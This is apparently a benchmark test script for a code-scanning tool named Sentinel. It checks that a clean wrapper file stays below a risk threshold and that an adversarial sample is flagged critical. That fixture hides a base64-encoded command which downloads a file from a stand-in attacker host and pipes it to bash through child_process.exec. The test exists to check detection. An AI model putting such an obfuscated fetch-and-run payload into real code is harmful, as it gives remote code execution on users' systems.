const path = require('path');
const fs = require('fs');
const scanner = require('../src/ui/backend/scanner/index');

const BENCHMARK_FILES = [
    {
        name: 'gh_bridge.js',
        desc: 'Clean Tooling Wrapper (Must yield negligible FP Score)',
        path: path.join(__dirname, '../src/ui/backend/lib/gh_bridge.js'),
        expectClean: true, // Should not flag Critical or High
    },
    {
        name: 'adversarial_base64_wrapper.js',
        desc: 'Malicious Evasion Payload (Must yield Critical Score)',
        content: `
            const cp = require('child_process');
            const payload = Buffer.from('Y3VybCAtcyBodHRwczovL2V2aWwuY29tL3NoLmV4ZSB8IGJhc2g=', 'base64').toString('ascii');
            setTimeout(() => {
                cp.exec(payload, (err, out) => console.log(out));
            }, 1000);
        `,
        expectCritical: true, // Must score >= 80 (CRITICAL)
    }
];

function runSuite() {
    console.log("=========================================");
    console.log("🛡️  Sentinel Policy & Benchmark Gate 🛡️");
    console.log("=========================================\n");

    let failures = 0;

    BENCHMARK_FILES.forEach(t => {
        console.log(`[TEST] ${t.desc}`);
        let content = t.content;
        
        if (t.path) {
            content = fs.readFileSync(t.path, 'utf8');
        }

        const scanResult = scanner.scanFile(t.name, content, null, { mode: 'local' });
        
        // Determinar FP rate o TPR
        const maxScore = scanResult.alerts.length > 0 
            ? Math.max(...scanResult.alerts.map(a => a.riskLevel))
            : 0;
            
        if (scanResult.alerts.some(a => !a.rule_id || !a.explanation)) {
            console.error(`  ❌ FAILED: Found alerts lacking mandatory Auditability properties ('rule_id' or 'explanation') in ${t.name}. Governance rule breached.`);
            failures++;
        }

        if (t.expectClean) {
            if (maxScore >= 65) {
                console.error(`  ❌ FAILED: False Positive Regression. '${t.name}' spiked to score ${maxScore} (Expected < 65).`);
                failures++;
            } else {
                console.log(`  ✅ PASSED: '${t.name}' stayed clean (Max Score: ${maxScore})`);
            }
        }

        if (t.expectCritical) {
            if (maxScore < 80) {
                console.error(`  ❌ FAILED: Evasion Regression. '${t.name}' dropped to score ${maxScore} (Expected >= 80). Sentinel failed to detect threat.`);
                failures++;
            } else {
                console.log(`  ✅ PASSED: Adversarial caught '${t.name}' (Score: ${maxScore})`);
            }
        }
        console.log('---');
    });

    if (failures > 0) {
        console.error(`\n💥 Benchmark Suite FAILED with ${failures} regressions.`);
        console.error(`Policy Engine blocked the release package. Fix the heuristics and re-run.`);
        process.exit(1);
    } else {
        console.log(`\n✅ Benchmark Suite PASSED. Zero False Positives in Core. 100% Threat Trace Recall.`);
        process.exit(0);
    }
}

runSuite();
